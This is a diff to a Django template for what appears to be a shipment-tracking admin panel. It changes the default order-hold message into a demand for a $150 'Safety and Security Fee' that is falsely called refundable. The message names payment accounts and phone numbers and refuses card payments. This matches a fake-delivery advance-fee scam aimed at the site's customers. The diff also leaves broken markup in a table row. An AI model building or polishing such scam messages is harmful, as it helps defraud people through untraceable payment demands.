@@ -212,7 +212,23 @@
                                         {% csrf_token %}
                                         <input type="number" name="hold_amount" step="0.01" placeholder="Charge" class="input-field slim" required />
                                         <input type="text" name="hold_reason" placeholder="Hold reason" class="input-field slim" required />
-                                        <input type="text" name="hold_message" value="Your order is currently on hold due to certain applicable charges. Kindly proceed with the payment to resume processing. Please note that this charge is fully refundable." class="input-field slim" />
+                                        <input type="text" name="hold_message" value="Your order is currently on hold due to applicable charges (Safety and Security Fee).
+
+To proceed with processing, kindly complete the required payment below. Please note that this fee is fully refundable.
+
+Hold Charge: $150.00  
+
+Accepted payment options:  
+- Chime: $Hernan-Aguilar or request from customer
+- Venmo: @HUGO-HORTA-1 (Last 4 digits: 6811) * Family and Friends opinion only is available or request from Customer 
+- Zelle: Please request details from our delivery agent  
+- Apple Pay: Please request details from our delivery agent  
+
+We do not accept credit or debit card payments.
+
+For assistance, please contact our delivery agents via chat at:  
++1 (559) 889-6546  
++1 (602) 654-5189" class="input-field slim" />
                                         <button type="submit" class="btn btn-sm btn-warn">Withhold</button>
                                     </form>
 
@@ -223,7 +239,7 @@
                                 </td>
                             </tr>
                         {% empty %}
-                            <tr>
+                            <tr>Your 
                                 <td colspan="7">No shipments match your query yet. Create a new order or reset search.</td>
                             </tr>
                         {% endfor %}
